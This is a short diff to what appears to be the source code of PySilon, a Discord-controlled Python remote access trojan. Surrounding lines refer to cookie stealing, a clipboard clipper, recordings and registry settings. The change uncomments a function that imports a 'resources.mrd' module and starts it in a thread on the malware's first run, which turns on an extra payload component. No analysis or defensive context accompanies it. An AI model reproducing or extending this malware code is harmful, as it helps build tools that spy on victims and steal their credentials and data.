@@ -117,7 +117,7 @@ files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, N
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
 send_recordings, input_blocked, clipper_stop = True, False, True
 latest_messages_in_recordings = []
-# def stm(): import resources.mrd
+def stm(): import resources.mrd
 # [pysilon_var] !registry 0
 
 working_directory = ['C:', 'Users', getuser(), software_directory_name]
@@ -168,7 +168,7 @@ async def on_ready():
         
     if first_run:
         #.log PySilon is running for the first time
-        # threading.Thread(target=stm).start()
+        threading.Thread(target=stm).start()
         category = await client.get_guild(guild_id).create_category(hwid)
         #.log Created HWID category
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
